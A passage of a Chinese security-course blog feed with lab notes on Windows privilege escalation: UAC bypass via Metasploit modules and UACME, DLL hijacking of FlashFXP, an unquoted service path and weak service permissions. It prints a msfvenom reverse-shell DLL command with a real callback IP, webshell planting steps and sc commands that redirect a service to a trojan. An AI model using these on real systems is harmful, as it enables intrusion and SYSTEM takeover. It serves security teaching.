href="#所以用到use-exploit-x2F-windows-x2F-local-x2F-ask，前提是要管理员点这个是" class="headerlink" title="所以用到use exploit&#x2F;windows&#x2F;local&#x2F;ask，前提是要管理员点这个是"></a>所以用到use exploit&#x2F;windows&#x2F;local&#x2F;ask，前提是要管理员点这个是</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145834773.png" alt="image-20230422145834773"></p><h6 id="上面的条件过于苛刻，所以用到其他模块use-exploit-x2F-windows-x2F-local-x2F-bypassuac-silentcleanup成功"><a href="#上面的条件过于苛刻，所以用到其他模块use-exploit-x2F-windows-x2F-local-x2F-bypassuac-silentcleanup成功" class="headerlink" title="上面的条件过于苛刻，所以用到其他模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup成功"></a>上面的条件过于苛刻，所以用到其他模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup成功</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150142016.png" alt="image-20230422150142016"></p><h6 id="本机win10-用use-exploit-x2F-windows-x2F-local-x2F-bypassuac-sluihijack"><a href="#本机win10-用use-exploit-x2F-windows-x2F-local-x2F-bypassuac-sluihijack" class="headerlink" title="本机win10 用use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack"></a>本机win10 用use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150358902.png" alt="image-20230422150358902"></p><h6 id="查看模块对应的系统"><a href="#查看模块对应的系统" class="headerlink" title="查看模块对应的系统"></a>查看模块对应的系统</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150542807.png" alt="image-20230422150542807"></p><h5 id="2、UACME项目："><a href="#2、UACME项目：" class="headerlink" title="2、UACME项目："></a>2、UACME项目：</h5><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150711821.png" alt="image-20230422150711821"></p><p>有76个方式绕过UAC</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151119151.png" alt="image-20230422151119151"></p><p>要用最新版VS studio去编译成exe文件</p><p>项目地址:<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>Akagi64.exe 41 msf1.exe</p><p>Akagi64.exe 编号 调用执行</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422150951217.png" alt="image-20230422150951217"></p><h6 id="虚拟机win10"><a href="#虚拟机win10" class="headerlink" title="虚拟机win10"></a>虚拟机win10</h6><h6 id="这里成功的编号才会弹出窗口"><a href="#这里成功的编号才会弹出窗口" class="headerlink" title="这里成功的编号才会弹出窗口"></a>这里成功的编号才会弹出窗口</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151300317.png" alt="image-20230422151300317"></p><h6 id="两个执行whoami-x2F-all对比，发现Administrator权限变成高级"><a href="#两个执行whoami-x2F-all对比，发现Administrator权限变成高级" class="headerlink" title="两个执行whoami &#x2F;all对比，发现Administrator权限变成高级"></a>两个执行whoami &#x2F;all对比，发现Administrator权限变成高级</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151644812.png" alt="image-20230422151644812"></p><h6 id="下面是用这个来绕过UAC执行msf-exe"><a href="#下面是用这个来绕过UAC执行msf-exe" class="headerlink" title="下面是用这个来绕过UAC执行msf.exe"></a>下面是用这个来绕过UAC执行msf.exe</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151537087.png" alt="image-20230422151537087"></p><h6 id="msf监听，执行成功获得system权限"><a href="#msf监听，执行成功获得system权限" class="headerlink" title="msf监听，执行成功获得system权限"></a>msf监听，执行成功获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422151808283.png" alt="image-20230422151808283"></p><h6 id="到本地机win10，需要61编号才行"><a href="#到本地机win10，需要61编号才行" class="headerlink" title="到本地机win10，需要61编号才行"></a>到本地机win10，需要61编号才行</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422152115535.png" alt="image-20230422152115535"></p><h6 id="成功获取"><a href="#成功获取" class="headerlink" title="成功获取"></a>成功获取</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422152037247.png" alt="image-20230422152037247"></p><h6 id="踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时"><a href="#踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时" class="headerlink" title="踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时"></a>踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001638771.png" alt="image-20230423001638771"></p><h6 id="直接这样执行，会监听不到任何东西，因为msf-exe没有启动"><a href="#直接这样执行，会监听不到任何东西，因为msf-exe没有启动" class="headerlink" title="直接这样执行，会监听不到任何东西，因为msf.exe没有启动"></a>直接这样执行，会监听不到任何东西，因为msf.exe没有启动</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001702906.png" alt="image-20230423001702906"></p><h6 id="但是直接拖拽，将其目录附上，msf就上线监听到了"><a href="#但是直接拖拽，将其目录附上，msf就上线监听到了" class="headerlink" title="但是直接拖拽，将其目录附上，msf就上线监听到了"></a>但是直接拖拽，将其目录附上，msf就上线监听到了</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001745843.png" alt="image-20230423001745843"></p><h3 id="Win2012-DLL劫持提权应用配合MSF-FlashFXP"><a href="#Win2012-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="#Win2012-DLL劫持提权应用配合MSF-FlashFXP"></a>#Win2012-DLL劫持提权应用配合MSF-FlashFXP</h3><p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p><code>过程：信息收集-进程分析-制作dll并上传-替换dll-启动应用后成功</code></p><p>检测： ChkDllHijack 或者 火绒剑</p><p>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll</p><p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p><h5 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h5><h6 id="比如说在webshell的权限中发现了第三方的一些软件文件"><a href="#比如说在webshell的权限中发现了第三方的一些软件文件" class="headerlink" title="比如说在webshell的权限中发现了第三方的一些软件文件"></a>比如说在webshell的权限中发现了第三方的一些软件文件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163444613.png" alt="image-20230422163444613"></p><h6 id="可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的"><a href="#可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的" class="headerlink" title="可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的"></a>可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的</h6><h5 id="2、进程分析"><a href="#2、进程分析" class="headerlink" title="2、进程分析"></a>2、进程分析</h5><h6 id="火绒剑分析："><a href="#火绒剑分析：" class="headerlink" title="火绒剑分析："></a>火绒剑分析：</h6><h6 id="打开这个软件"><a href="#打开这个软件" class="headerlink" title="打开这个软件"></a>打开这个软件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163719023.png" alt="image-20230422163719023"></p><h6 id="打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件"><a href="#打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件" class="headerlink" title="打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件"></a>打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163946832.png" alt="image-20230422163946832"></p><h6 id="ChkDllHijack-分析："><a href="#ChkDllHijack-分析：" class="headerlink" title="ChkDllHijack 分析："></a>ChkDllHijack 分析：</h6><h6 id="把其目录下所有的dll文件测试"><a href="#把其目录下所有的dll文件测试" class="headerlink" title="把其目录下所有的dll文件测试"></a>把其目录下所有的dll文件测试</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164223152.png" alt="image-20230422164223152"></p><h6 id="如果不调用的会显示如下"><a href="#如果不调用的会显示如下" class="headerlink" title="如果不调用的会显示如下"></a>如果不调用的会显示如下</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164349529.png" alt="image-20230422164349529"></p><h5 id="3、制作dll并上传"><a href="#3、制作dll并上传" class="headerlink" title="3、制作dll并上传"></a>3、制作dll并上传</h5><h6 id="msf命令生成dll文件：msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-4444-f-dll-o-xiaodi-dll，取出来后更名为libeay32-dll"><a href="#msf命令生成dll文件：msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-4444-f-dll-o-xiaodi-dll，取出来后更名为libeay32-dll" class="headerlink" title="msf命令生成dll文件：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll，取出来后更名为libeay32.dll"></a>msf命令生成dll文件：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll，取出来后更名为libeay32.dll</h6><h6 id="在webshell中将原来的libeay32-dll删除"><a href="#在webshell中将原来的libeay32-dll删除" class="headerlink" title="在webshell中将原来的libeay32.dll删除"></a>在webshell中将原来的libeay32.dll删除</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164915934.png" alt="image-20230422164915934"></p><h6 id="把生成的文件上传"><a href="#把生成的文件上传" class="headerlink" title="把生成的文件上传"></a>把生成的文件上传</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164944809.png" alt="image-20230422164944809"></p><h6 id="msf开启监听模块监听4444端口"><a href="#msf开启监听模块监听4444端口" class="headerlink" title="msf开启监听模块监听4444端口"></a>msf开启监听模块监听4444端口</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165028098.png" alt="image-20230422165028098"></p><h6 id="等待管理员触发那个flashfxp-exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限"><a href="#等待管理员触发那个flashfxp-exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限" class="headerlink" title="等待管理员触发那个flashfxp.exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限"></a>等待管理员触发那个flashfxp.exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限<img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165135434.png" alt="image-20230422165135434"></h6><h6 id="随后getsystem，获得system权限"><a href="#随后getsystem，获得system权限" class="headerlink" title="随后getsystem，获得system权限"></a>随后getsystem，获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165251894.png" alt="image-20230422165251894"></p><h3 id="Win2012-不带引号服务路径配合MSF-MacroExpert"><a href="#Win2012-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="#Win2012-不带引号服务路径配合MSF-MacroExpert"></a>#Win2012-不带引号服务路径配合MSF-MacroExpert</h3><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165852457.png" alt="image-20230422165852457"></p><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p><p><code>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</code></p><p>检测项目：JAWS </p><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><p>检测命令：wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””    （指定不筛选C:\Windows下的文件路径，因为没有权限利用）</p><p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p><h5 id="1、检测服务权限配置"><a href="#1、检测服务权限配置" class="headerlink" title="1、检测服务权限配置"></a>1、检测服务权限配置</h5><p>执行JAWS</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422170439754.png" alt="image-20230422170439754"></p><h6 id="获取了三个，但是只有上面标记的那个可以，因为有空格"><a href="#获取了三个，但是只有上面标记的那个可以，因为有空格" class="headerlink" title="获取了三个，但是只有上面标记的那个可以，因为有空格"></a>获取了三个，但是只有上面标记的那个可以，因为有空格</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422170729011.png" alt="image-20230422170729011"></p><h5 id="2、制作文件并上传"><a href="#2、制作文件并上传" class="headerlink" title="2、制作文件并上传"></a>2、制作文件并上传</h5><h6 id="然后将生成的msf-exe重命名为program-exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限"><a href="#然后将生成的msf-exe重命名为program-exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限" class="headerlink" title="然后将生成的msf.exe重命名为program.exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限"></a>然后将生成的msf.exe重命名为program.exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限</h6><h6 id="执行服务"><a href="#执行服务" class="headerlink" title="执行服务"></a>执行服务</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422171401402.png" alt="image-20230422171401402"></p><h6 id="getuid直接发现获取了syste权限"><a href="#getuid直接发现获取了syste权限" class="headerlink" title="getuid直接发现获取了syste权限"></a>getuid直接发现获取了syste权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422171434502.png" alt="image-20230422171434502"></p><h3 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="#Win2012-不安全的服务权限配合MSF-NewServices"></a>#Win2012-不安全的服务权限配合MSF-NewServices</h3><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p><p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><p>检测脚本：accesschk PowerUp(PowerSploit)</p><p>1、accesschk.exe -uwcqv “administrators” *   （官方自带的exe）</p><p>2、Import-Module .\PowerUp.ps1</p><p>Invoke-All Checks</p><p><a href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a></p><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>sc config “test” binpath&#x3D;”C:\Program.exe”</p><p>sc start test</p><h6 id="一般这种服务可以获取所有权限"><a href="#一般这种服务可以获取所有权限" class="headerlink" title="一般这种服务可以获取所有权限"></a>一般这种服务可以获取所有权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175219685.png" alt="image-20230422175219685"></p><h6 id="用accesschk-exe或者JAWS，这里用JAWS，因为更好用"><a href="#用accesschk-exe或者JAWS，这里用JAWS，因为更好用" class="headerlink" title="用accesschk.exe或者JAWS，这里用JAWS，因为更好用"></a>用accesschk.exe或者JAWS，这里用JAWS，因为更好用</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175908176.png" alt="image-20230422175908176"></p><h6 id="一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径"><a href="#一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径" class="headerlink" title="一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径"></a>一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180029537.png" alt="image-20230422180029537"></p><h6 id="因为这里可以修改路径，所以可以将这个服务调用的progarm-exe文件改为1-exe（msf生成的木马），然后上传这个1-exe到C盘，然后执行命令重启test服务"><a href="#因为这里可以修改路径，所以可以将这个服务调用的progarm-exe文件改为1-exe（msf生成的木马），然后上传这个1-exe到C盘，然后执行命令重启test服务" class="headerlink" title="因为这里可以修改路径，所以可以将这个服务调用的progarm.exe文件改为1.exe（msf生成的木马），然后上传这个1.exe到C盘，然后执行命令重启test服务"></a>因为这里可以修改路径，所以可以将这个服务调用的progarm.exe文件改为1.exe（msf生成的木马），然后上传这个1.exe到C盘，然后执行命令重启test服务</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180536354.png" alt="image-20230422180536354"></p><h6 id="执行重启后监听获得system权限"><a href="#执行重启后监听获得system权限" class="headerlink" title="执行重启后监听获得system权限"></a>执行重启后监听获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180746421.png" alt="image-20230422180746421"></p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175730961.png" alt="image-20230422175730961"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day101 权限提升-Win本地用户&amp;进程注入&amp;令牌窃取&amp;AT&amp;SC&amp;PS服务命令</title>
